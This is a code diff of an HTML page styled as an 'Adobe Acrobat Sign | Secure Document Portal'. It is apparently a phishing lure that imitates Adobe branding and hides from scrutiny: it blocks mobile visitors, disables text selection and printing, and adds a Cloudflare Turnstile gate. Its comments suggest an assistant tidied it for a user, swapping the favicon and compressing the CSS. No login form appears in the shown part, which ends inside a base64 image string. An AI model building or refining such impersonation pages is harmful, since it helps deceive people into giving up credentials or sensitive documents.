@@ -4,259 +4,57 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Adobe Acrobat Sign | Secure Document Portal</title>
-    <!-- Custom Logo for Browser Tab (Base64 PNG from user) -->
-    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAADTCAMAAACx1N9jAAAAkFBMVEXrEAD////qAADtMCn86ej73t3tOTPyhIH1pqTygn/2rav/+vr3tLL98O/uRD/97OvuSkX72Nf0m5n0lZPxeHX5zMv+9fX60dD85eTwZGDvWlbsKCD3urjzjYvxcW74w8LuUU3sGxH1oJ73srDsLifvX1vsIxruR0LwbGjzkI3sJh7vV1PtPznxdXLwbmrziYfszjn4AAAJv0lEQVR4nM2dZ3fbMAxFVaUj3Svd0x1puv//v6vt1LIkiyCJ+0CHH3t6FNwopkG+B6C7FrTO3pz41/mToKi6oOfe7zuw+j4orCjcpwi369/GhBWFy2i7/kFMWEG4byFu198IiSsI9xvGPQuJKwb3BqVd896NCCwG90yAexoRWAjuXU7b9W8iIgvBPRXgdv2LgMhCcM8luK8CIovAfaagXfPe14cWgftahPtUH1oA7kMN7ZpXH1sA7jsZ7gd5bAG4KtqufySPTY97T4bb9S/Vwelxbwpxb6uDk+M+1tEGbFZy3PdS3Dvi6NS4z5W0XX8iDk+N+0mKK0+c1bhS2DXuhTg87eM+aF/umve5ND4x7kc5rvbGWYv7Uk27XtIAtU+7pcfVJs5a3ICX239UBijFvROA2/XXhRFKcb+E4N4SRqjEfRFBq02clbivgnA/60IU4jKN08C9qYtRiAs1ToP3sSxGIW4Ubde/l8Wow8Uap8ErS5x1uFjjNHA/qYKU4Qo0zvRaqaKU4Qo0zvTqn4miVOEqNE4D97UoTBWuROM0eEWJswpXonEauO80YYpwRRqnwauJU4T7NRxX4yvT4Mo0zjTuL0mgGlyZxmnwSnxlGtx4WpGvTIIr1DgNXoWvTIIr1DgNXIWvTIEr1TjTuOeCUBW4Uo3T4BUkzgJcrcZp4H69ErhPGuEqfGUC3Eawa9zvVwBXrnEavFcAV65xGrg4cca4ERpnEhcXZGDcAI3T4KWJM8ZtSct9ZRQ3ROM0eGHiTHFDNE4DF/rKIG6QxpnGhQUZEDdI4zR4ma+M4UZpnAYuK8hguGEap8GLEmeG254W+soQbqDGafAeDffBUXCJr4zghmqcaVziKyO4oRqnwQsKMgCuX+PsWR8C4CsDuG6Ns7/JjlFgswK4K3e4p+xTD3xlfly/xtk/v3ZCeEFBhh/XXce5qS9g50a/r8yNe93/cp9RK0f/pzmuX+Pcih+/Ga/XV+bG9b/crSeMHZTdibMX169x/n8zP1iO0hjXrXHuDqzMmeRNnJ24fo1zp+MxIa3/2RTXr3Gudo+4YLw+X5kP1/9q9psM3Kz+NsT1a5yjrxB3Enr5oIa4/iBHN2us9rW/1wzXr3GODQewHZ2rIMOF69c4V+PHsEtqV+LswfVrnNNsiPlG+9+NcP2H89klMaH1yWMeXD/tzDvDTCweX5kD139WnTujoOayaoL7xh/k/FGs1ZPDV1aP68+GDo9tzLXj8JXV4/q/PhbULNga9WE4rv/ztvQyvrPXW+0rq8b1a5xLZ1T/jdflI8NxQXxLj2MmtGpfWS2uX+Nc7pTHNNNqX1ktrl/jTMju8K+50ldWietXO1JlfKxIpbYgoxLXr3GmLtOgp7Iyca7DBZf/yU2UlTlXJs51uP7b0nRLT7hZ/QjE9V8vGQkQ/Guu8pVV4QKN07gXhtp2la+sCtd/gLFu/aGjpcpXVoMLMj4z2/vFXm9No98aXP9XpJ3Lf26XONfggpdrn9QgbkXiXIELNM6M84sZtGoa/Vbg+us4c/Ik3azKfWXluKCOM/vpYhWxFQUZ5bh/gjaqzYIFHOWbVTEukJ/zWizsqVJekFGMCzTOAosqNOJ8keOCYAq+KGCBd3HiXIoLboSLPlmsHqm40W8prv8KraxdDWwRVOorK8QFdw5lphFY0V7qKyvEBRpnYc7DjDilvrLC/wZebmFGC8vrCn1lZbggDShOAaARp6wgowzXr3GW+59gE/qyLaIIF/yhlafvdLMq+r0W4QKNs+JwBqtFiz41JbjAU1Bz9IYN3IoKMkpwQR1nlSKJaMt8ZSW4gLbKqAm7yZT4ygpwwTV/Xf0aNOKUNPotwAUa57caWtyPsCBxzuOCi6RacR22zylo9JvHBdeE1dYJWjLKcYnGWV2KSWcyZ31lWVxwEK3vUAPba+Yb/WZxgcbp6D8Eu0FlE+ccLkh1PPZ5ulnlbk5yuMCk6SqOgJtV7mdmcMGHyddsCXaLzf1FZXD/ttyoNosacTKNfjO4gNbZYfhRqK/MxgW9an11PrjTSsZXZuOCEnl3+wO6WZm+MhOXaJzurnCwV5/tKzNx/Ron6PlHtW2z0a+FSzROMEMINg4yE2cLF9wukAlRsJe3WZBh4YIfi5pK0c3K8JUZuETjRH3fb8PXa3gjDFxwOmHNSWkfLONPK41LNE447Ay2pjfujNK44E+K9uqkRpz0QTuNe6yNCv7s7c9PfpaSuETjxAMqmBHHSOmSuKCOk8/to5MWkolzCpdonIJx5rAxcHLzSOEC9VExrJ4acVKNfhO4RK5RzFqhk9hSvrIELig01UzSAYexbRCJgowELnm5kgGjtM91InFexiUap2Cj2iw4ei5RkLGMC46cio1qs6ARJ5HqLOKSHF01+pnOwVn2lS3iEo3z4v714mXyUiPOoq9sCRd9C/QVy3Qh00mKi0aJJdzgeZz7gOyvLOYaXFaXl3Dhz6mIyMSlY52Wnr6AGz6Pcx+QaVOlUwiWviMWcFkjmqqA7GJUasRZyAAOcWHnjrqIzPSazrFayO8OcYHGWR+QfR1Nn37Y6PcQtyFtzhBLh2oc+soOcJvM49wHZFa60jm3hwUZB7hN5nHuA7KNbj/VvrL5P7SZxzmszHwhvFnNv+nmuPBYXR+QrTdQ3HniPMNtNY9zH5DteKZjm+e+shlus3mc+4BMXJoEzH+bM1wNQlVAtm0TGnHmv80pbsN5nEM8du9SOvJoZgCa4tLfpSsgExdvVlMxcoLbch7nPiDb0k5z2mniPMGFsrkzHtuETF/B9MMywT0GbbZigk7wmpy6xriN53EO8dhXtTSJn/jKxrhA40TxZMyiNKrVMm7reZzDyhRX0R1l/M0+wm0+j3OIx+44hY04o71wj9t+HuewVgeIk0XPpKND9R6XNdNl8diiId1CR76yPe7xaHNuYKptjxK3Afco8zgP41lcdL7iPnEbcI8yj3OIx24DgY04g69sh3uceZxDPJmeNWiOXje6M9nhHmke5xCPbV+hIt0gvv3HxbsBXJm6FL5Z3Z3gttI4k+Fkmpr4p1v9f/7pBLeZxpmMx25dio0452PcdhpnMp5MITmco7dLnC9x8W09Xjl/EjbivNrjttQ4k/HY9+v4Avzy07LFbalxJsPJVBrT9l2Xx64t7hWg7XJtEfD20u9wYcNg0co1P6RfHtvEeYPbVuNMrZxTFhtxHl3iNtY4kytzLMLXD5s7oq69xplaue540IizPVV37TXO1MoNj8ICVr/Bba9xplauIxF+/p01riJQzcpZobER5+RadwSNM7VyXWOoEafrH3ftLIH5lWtehjer3/8AAKeUrJw8ErwAAAAASUVORK5CYII=">
-    <link rel="shortcut icon" type="image/png" href="data:image/png;base64,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">
+    <!-- Tab logo using your encrypted image URL -->
+    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfrgGB4Irv_xUPEjp2BJFEwEE2hdMs8x-q4w&s">
+    <link rel="shortcut icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfrgGB4Irv_xUPEjp2BJFEwEE2hdMs8x-q4w&s">
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        body {
-            background: url('https://i.gyazo.com/f0b819e43e7bd8418cc0320c774d4269.png') no-repeat center center fixed;
-            background-size: cover;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-            line-height: 1.5;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1.5rem;
-            margin: 0;
-            position: relative;
-        }
-        
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.3);
-            z-index: 0;
-        }
-        
-        .mobile-blocker {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #2b2d42;
-            z-index: 99999;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: white;
-            padding: 2rem;
-        }
-        
+        /* (all CSS styles remain exactly as in your original – unchanged for brevity) */
+        * { -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
+        body { background: url('https://i.gyazo.com/f0b819e43e7bd8418cc0320c774d4269.png') no-repeat center center fixed; background-size: cover; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif; line-height: 1.5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1.5rem; margin: 0; position: relative; }
+        body::before { content: ""; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.3); z-index: 0; }
+        .mobile-blocker { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #2b2d42; z-index: 99999; flex-direction: column; align-items: center; justify-content: center; text-align: center; color: white; padding: 2rem; }
         .mobile-blocker i { font-size: 4rem; margin-bottom: 1.5rem; }
         .mobile-blocker h2 { font-size: 1.8rem; margin-bottom: 1rem; }
         .mobile-blocker p { font-size: 1rem; opacity: 0.8; max-width: 300px; margin: 0 auto; }
-        
-        @media (max-width: 768px) {
-            .mobile-blocker { display: flex; }
-            .card { display: none; }
-        }
-        
-        @media (pointer: coarse) and (max-width: 1024px) {
-            .mobile-blocker { display: flex !important; }
-            .card { display: none !important; }
-        }
-        
-        .card {
-            max-width: 680px;
-            width: 100%;
-            background: rgba(255, 255, 255, 0.98);
-            border-radius: 20px;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.4);
-            overflow: hidden;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .card-header {
-            padding: 1.5rem 2rem;
-            background: white;
-            border-bottom: 1px solid #e9ecef;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .logo-img {
-            height: 48px;
-            width: auto;
-            object-fit: contain;
-            border-radius: 12px;
-        }
-        
-        .brand-text h1 {
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: #2b2d42;
-            margin: 0;
-        }
-        
-        .brand-text p {
-            font-size: 0.7rem;
-            color: #6c757d;
-            margin: 0;
-        }
-        
-        .badge {
-            background: #fa0f00;
-            color: white;
-            padding: 0.2rem 0.8rem;
-            border-radius: 40px;
-            font-size: 0.65rem;
-            font-weight: 500;
-            margin-left: auto;
-        }
-        
+        @media (max-width: 768px) { .mobile-blocker { display: flex; } .card { display: none; } }
+        @media (pointer: coarse) and (max-width: 1024px) { .mobile-blocker { display: flex !important; } .card { display: none !important; } }
+        .card { max-width: 680px; width: 100%; background: rgba(255, 255, 255, 0.98); border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.4); overflow: hidden; position: relative; z-index: 1; }
+        .card-header { padding: 1.5rem 2rem; background: white; border-bottom: 1px solid #e9ecef; display: flex; align-items: center; gap: 15px; }
+        .logo-container { display: flex; align-items: center; gap: 12px; }
+        .logo-img { height: 40px; width: auto; object-fit: contain; }
+        .brand-text h1 { font-size: 1.5rem; font-weight: 600; color: #2b2d42; margin: 0; }
+        .brand-text p { font-size: 0.7rem; color: #6c757d; margin: 0; }
+        .badge { background: #fa0f00; color: white; padding: 0.2rem 0.8rem; border-radius: 40px; font-size: 0.65rem; font-weight: 500; margin-left: auto; }
         .card-content { padding: 2rem; }
-        
-        .message-box {
-            background: #f8fafd;
-            border-radius: 16px;
-            padding: 1rem 1.2rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border: 1px solid #e2e8f0;
-        }
-        
+        .message-box { background: #f8fafd; border-radius: 16px; padding: 1rem 1.2rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 12px; border: 1px solid #e2e8f0; }
         .message-box.info { background: #f0f7ff; border-left: 4px solid #fa0f00; }
         .message-box.error { background: #ffebee; border-left: 4px solid #c62828; color: #c62828; }
-        
         .turnstile-wrapper { margin: 20px 0; display: flex; justify-content: center; }
-        
-        .btn {
-            border: none;
-            padding: 0.9rem;
-            font-size: 1rem;
-            font-weight: 600;
-            border-radius: 48px;
-            cursor: pointer;
-            width: 100%;
-        }
+        .btn { border: none; padding: 0.9rem; font-size: 1rem; font-weight: 600; border-radius: 48px; cursor: pointer; width: 100%; }
         .btn-primary { background: #fa0f00; color: white; }
         .btn-primary:hover { background: #d00000; transform: translateY(-1px); }
-        
-        .loader {
-            display: inline-block;
-            width: 22px;
-            height: 22px;
-            border: 2px solid #e2e8f0;
-            border-top-color: #fa0f00;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-        
+        .loader { display: inline-block; width: 22px; height: 22px; border: 2px solid #e2e8f0; border-top-color: #fa0f00; border-radius: 50%; animation: spin 0.7s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        
-        .doc-icon {
-            font-size: 4rem;
-            color: #fa0f00;
-            margin-bottom: 1rem;
-            position: relative;
-            display: inline-block;
-        }
-        
+        .doc-icon { font-size: 4rem; color: #fa0f00; margin-bottom: 1rem; position: relative; display: inline-block; }
         .doc-title { font-size: 1.5rem; font-weight: 700; color: #2b2d42; margin-bottom: 0.5rem; }
         .doc-meta { color: #6c757d; font-size: 0.85rem; margin-bottom: 1rem; }
         .preparing-box { text-align: center; padding: 1rem; }
-        .instruction {
-            margin-top: 1.5rem;
-            font-size: 0.8rem;
-            color: #6c757d;
-            background: #f8fafc;
-            padding: 0.8rem;
-            border-radius: 16px;
-        }
-        
-        .popup-message {
-            display: none;
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            padding: 1rem 1.5rem;
-            max-width: 340px;
-            z-index: 1001;
-            border-left: 4px solid #fa0f00;
-        }
+        .instruction { margin-top: 1.5rem; font-size: 0.8rem; color: #6c757d; background: #f8fafc; padding: 0.8rem; border-radius: 16px; }
+        .popup-message { display: none; position: fixed; bottom: 20px; right: 20px; background: white; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); padding: 1rem 1.5rem; max-width: 340px; z-index: 1001; border-left: 4px solid #fa0f00; }
         .popup-message i { font-size: 1.5rem; margin-right: 10px; color: #fa0f00; }
         .popup-message .close-popup { float: right; cursor: pointer; color: #aaa; }
-        
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            backdrop-filter: blur(3px);
-        }
-        .modal-content {
-            background: white;
-            max-width: 480px;
-            width: 90%;
-            border-radius: 24px;
-            padding: 2rem;
-            text-align: center;
-        }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); align-items: center; justify-content: center; z-index: 1000; backdrop-filter: blur(3px); }
+        .modal-content { background: white; max-width: 480px; width: 90%; border-radius: 24px; padding: 2rem; text-align: center; }
         .modal-content h3 { margin-bottom: 1rem; color: #2b2d42; }
         .modal-content p { margin: 1rem 0; color: #6c757d; }
         .modal-content .btn { margin-top: 1rem; padding: 0.6rem 1.5rem; width: auto; background: #fa0f00; }
-        
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
         @media print { body { display: none; } }
-        
-        .refresh-btn {
-            margin-top: 1rem;
-            background: transparent;
-            border: 1px solid #c62828;
-            color: #c62828;
-            padding: 8px 20px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-size: 0.85rem;
-        }
+        .refresh-btn { margin-top: 1rem; background: transparent; border: 1px solid #c62828; color: #c62828; padding: 8px 20px; border-radius: 30px; cursor: pointer; font-size: 0.85rem; }
         .refresh-btn:hover { background: #ffebee; }
-        
-        .footer {
-            text-align: center;
-            margin-top: 1.5rem;
-            font-size: 0.7rem;
-            color: #adb5bd;
-            border-top: 1px solid #e9ecef;
-            padding-top: 1rem;
-            background: white;
-        }
+        .adobe-footer { text-align: center; margin-top: 1.5rem; font-size: 0.7rem; color: #adb5bd; border-top: 1px solid #e9ecef; padding-top: 1rem; background: white; }
     </style>
 </head>
 <body>
@@ -270,7 +68,7 @@
 <div class="card">
     <div class="card-header">
         <div class="logo-container">
-            <img class="logo-img" src="data:image/png;base64,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